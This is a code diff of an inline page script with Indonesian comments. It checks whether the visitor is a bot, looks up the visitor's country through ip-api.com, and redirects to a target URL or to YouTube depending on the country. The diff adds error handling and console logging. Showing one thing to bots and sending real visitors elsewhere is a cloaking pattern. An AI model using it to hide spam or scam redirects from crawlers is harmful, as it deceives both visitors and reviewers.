@@ -1,4 +1,3 @@
-
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             function isBot() {
@@ -23,8 +22,14 @@
                 }
 
                 fetch('https://ip-api.com/json/')
-                    .then(response => response.json())
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
                     .then(data => {
+                        console.log('Geolocation data:', data);
                         var country = data.countryCode;
 
                         // Definisikan URL berdasarkan negara
@@ -39,8 +44,10 @@
 
                         // Redirect pengguna berdasarkan negara
                         if (redirectCountries.includes(country)) {
+                            console.log(`Redirecting to ${targetUrl} for country: ${country}`);
                             window.location.href = targetUrl;
                         } else {
+                            console.log(`Redirecting to ${youtubeUrl} for country: ${country}`);
                             window.location.href = youtubeUrl;
                         }
                     })
@@ -53,4 +60,3 @@
             redirectToSmartURL();
         });
     </script>
-
